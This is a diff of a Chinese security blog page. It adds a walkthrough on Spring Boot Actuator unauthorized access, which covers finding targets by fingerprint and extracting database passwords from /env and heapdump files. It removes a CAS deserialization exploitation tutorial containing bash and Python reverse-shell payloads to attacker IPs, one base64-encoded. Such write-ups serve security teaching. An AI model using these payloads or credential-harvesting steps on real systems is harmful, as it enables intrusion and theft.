@@ -156,6 +156,149 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">SpringBoot未授权访问漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-13 20:41:34" itemprop="dateCreated datePublished" datetime="2023-08-13T20:41:34+08:00">2023-08-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-14 21:03:17" itemprop="dateModified" datetime="2023-08-14T21:03:17+08:00">2023-08-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="攻防演练-SpringBoot未授权访问漏洞"><a href="#攻防演练-SpringBoot未授权访问漏洞" class="headerlink" title="攻防演练|SpringBoot未授权访问漏洞"></a>攻防演练|SpringBoot未授权访问漏洞</h1><p><strong>免责声明</strong></p>
+<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
+<h2 id="0x01漏洞概述"><a href="#0x01漏洞概述" class="headerlink" title="0x01漏洞概述"></a>0x01漏洞概述</h2><p>​        Actuator是Spring Boot提供的服务监控和管理中间件，默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限。</p>
+<p><strong>/actuator目录中,寻找漏洞比较重要接口的有：</strong></p>
+<ul>
+<li>/env、/actuator/env</li>
+</ul>
+<p>​        GET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
+<ul>
+<li>/refresh、/actuator/refresh</li>
+</ul>
+<p>​        POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 <strong>RCE</strong> <strong>漏洞</strong>。</p>
+<ul>
+<li> /restart、/actuator/restart</li>
+</ul>
+<p>​        暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 <strong>RCE</strong> <strong>漏洞</strong>。</p>
+<ul>
+<li>/jolokia、/actuator/jolokia</li>
+</ul>
+<p>​        可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 <strong>RCE</strong> <strong>漏洞</strong>、获得星号遮掩的重要隐私信息的明文等。</p>
+<ul>
+<li> /trace、/actuator/httptrace</li>
+</ul>
+<p>​        一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
+<h2 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h2><p>​    都有可能</p>
+<h2 id="0x03漏洞环境或指纹"><a href="#0x03漏洞环境或指纹" class="headerlink" title="0x03漏洞环境或指纹"></a>0x03漏洞环境或指纹</h2><p><strong>Fofa指纹：</strong></p>
+<ul>
+<li>app=”vmware-SpringBoot-Framework”      #应用名称</li>
+<li>body=” Whitelabel Error Page”             #默认页面</li>
+<li>icon_hash=”116323821”                   #一片叶子的图标</li>
+</ul>
+<h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a><strong>漏洞环境</strong></h4><ul>
+<li><p><strong>默认页面：Whitelabel Error Page页面</strong></p>
+<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230813204709414.png" alt="image-20230813204709414">                             </p>
+</li>
+<li><p><strong>swagger接口页面/swagger-ui.html：</strong></p>
+<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230813204723191.png" alt="image-20230813204723191"></p>
+</li>
+</ul>
+<h2 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h2><p><strong>步骤1：找靶点</strong></p>
+<p>在图虎上利用关键词 body=”Whitelabel Error Page” 找到利用springboot框架搭建的网站 </p>
+<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202300692.png" alt="image-20230814202300692"></p>
+<p><strong>步骤2：尝试未授权访问 添加后缀/actuator 发现成功访问接口</strong></p>
+<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202326735.png" alt="image-20230814202326735"></p>
+<p><strong>步骤3：访问env目录</strong></p>
+<p>​        进入/actuator/env 查看相关配置信息（/actuator/env 查看全部环境属性，可以查询到一些敏感信息 例如redis的ip和端口 数据库的账号和密码 但大部分密码都存在加密） 查找关键词 password 发现 存在数据库密码 但进行加密 查看不了</p>
+<p>发现账号密码（例如mysql数据库）</p>
+<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202401815.png" alt="image-20230814202401815"></p>
+<p><strong>步骤4：查看其他接口信息</strong></p>
+<p>​        发现/actuator/heapdump没有禁止访问 （/heapdump Heapdump，即堆转储文件，是一个Java进程在某个时间点上的内存快照。HeapDump记录了JVM中堆内存运行的情况，保存了Java对象、类以及线程栈以及本地变量等信息，最重要的是里面可能存有数据库密码信息。） 访问自动下载heapdump文件</p>
+<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202432042.png" alt="image-20230814202432042"></p>
+<p><strong>步骤5：分析heapdump文件</strong></p>
+<p>利用MemoryAnalyzer工具打开heapdump分析。</p>
+<p>利用查找语句查找密码：<code>select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</code></p>
+<p>找到一些账号密码</p>
+<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202502840.png" alt="image-20230814202502840"></p>
+<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202530066.png" alt="image-20230814202530066"></p>
+<p> <img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230813204951037.png" alt="image-20230813204951037"></p>
+<p> <img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230813204957314.png" alt="image-20230813204957314"></p>
+<p>获取到数据库链接、用户名、密码</p>
+<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202604099.png" alt="image-20230814202604099"></p>
+<p>【<strong>知识补充</strong>】其他数据脱敏/星号数据获取方法可以参考：<a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1690,134 +1833,6 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/C20220511/article/details/130411429">https://blog.csdn.net/C20220511/article/details/130411429</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/C20220511/article/details/131397590">https://blog.csdn.net/C20220511/article/details/131397590</a></p>
 </center></center></center></center></center></center>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">CAS反序列化漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-08-13 11:14:17" itemprop="dateCreated datePublished" datetime="2023-08-13T11:14:17+08:00">2023-08-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-14 20:22:55" itemprop="dateModified" datetime="2023-08-14T20:22:55+08:00">2023-08-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="实战-CAS反序列化漏洞"><a href="#实战-CAS反序列化漏洞" class="headerlink" title="实战|CAS反序列化漏洞"></a>实战|CAS反序列化漏洞</h1><p><strong>免责声明</strong></p>
-<p><strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
-<h2 id="0x01漏洞概述"><a href="#0x01漏洞概述" class="headerlink" title="0x01漏洞概述"></a>0x01漏洞概述</h2><p>​    2016年被发现，漏洞成因是在4.1.7版本以前一直存在一个默认密钥问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，从而执行任意命令。</p>
-<h2 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h2><p>​    Apereo CAS 4.1.X~4.1.6</p>
-<h2 id="0x03漏洞环境或指纹"><a href="#0x03漏洞环境或指纹" class="headerlink" title="0x03漏洞环境或指纹"></a>0x03漏洞环境或指纹</h2><p><strong>指纹：</strong>execution等可以执行命令的参数</p>
-<p><strong>工具：</strong>apereo-cas-attack，Apereo-cas-attaack：使用ysoserial的CommonsCollections4生成加密后的Payload</p>
-<h2 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h2><h3 id="A、利用方式1：新建目录poc"><a href="#A、利用方式1：新建目录poc" class="headerlink" title="A、利用方式1：新建目录poc"></a><strong>A、利用方式1：新建目录poc</strong></h3><p>环境：vulhub环境（这里是安装了vulhub的kali）</p>
-<ul>
-<li><strong>步骤1：使用工具生成payload</strong></li>
-</ul>
-<p>工具：apereo-cas-attack</p>
-<p><strong>Payload指令</strong>：在tmp目录下新建success文档</p>
-<p><code>java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch /tmp/sucess&quot;</code></p>
-<p> <img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230813113103482.png" alt="image-20230813113103482"></p>
-<ul>
-<li><strong>步骤2：在CAS主页抓包</strong></li>
-</ul>
-<p>​    一般是登录界面且传递的参数可以执行命令，如execution参数。</p>
-<p><img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230813113026259.png" alt="image-20230813113026259"></p>
-<p>​    将步骤1生成的payload替换execution参数的值，注意不要把execution参数值后的其他参数删了；替换值，然后放包。</p>
-<ul>
-<li><strong>步骤3：查看结果</strong></li>
-</ul>
-<p>到tmp目录下查看是否有success文档，如果有则代表利用成功（存在漏洞）。</p>
-<h3 id="B、利用方式2：反弹shell"><a href="#B、利用方式2：反弹shell" class="headerlink" title="B、利用方式2：反弹shell"></a><strong>B、利用方式2：反弹shell</strong></h3><ul>
-<li><strong>步骤1：生成shell的payload</strong></li>
-</ul>
-<p>【Shell】：bash -i &gt;&amp; /dev/tcp/<font color="red">攻击机ip/监听端口</font>1 0&gt;&amp;1</p>
-<p>然后将shell进行base64编码</p>
-<p> <img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230813112103566.png" alt="image-20230813112103566"></p>
-<p><strong>利用工具生成payload：</strong></p>
-<p><strong>指令</strong>：<code>java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjM0LjgyLzQ0NDQgMD4mMQ==&#125; | &#123;base64,-d&#125; | &#123;bash,-i&#125;&quot;</code></p>
-<p><strong>得到payload1</strong></p>
-<p> <img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230813111715310.png" alt="image-20230813111715310"></p>
-<ul>
-<li><strong>步骤2：生成反弹shell</strong></li>
-</ul>
-<p>​       python生成的payload如下，然后直接替换execution后即可反弹成功（可能需要先进行base64编码）：</p>
-<p><strong>payload：</strong><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.0.3&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])</code></p>
-<p>​    192.168.0.3需要改为自己对应的ip，7777是监听端口</p>
-<ul>
-<li> <strong>步骤3：回显与检查</strong></li>
-</ul>
-<p>​    <strong>目的</strong>：网站所在系统环境无法出网，可能没发正常看到结果，回显可以直接看到命令执行的返回内容。</p>
-<p>​    使用魔改工具ysoserial-mangguogan-master，Payload如下，然后将编码后的数据替换execution，并且在请求头中添加cmd：whoami等命令，查看回显。</p>
-<p><code>Payload：java -jar ysoserial-managguogan-0.0.1-SNAPSHOT-all.jar encode CommonsCollections4</code></p>
-<ul>
-<li><strong>步骤4：查看回显结果</strong></li>
-</ul>
-<p>​    替换execution并在请求投输入执行命令（如：cmd：whoami）</p>
-<p><img src="/2023/08/13/CAS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230814201747991.png" alt="image-20230814201747991"></p>
-
       
     </div>
 
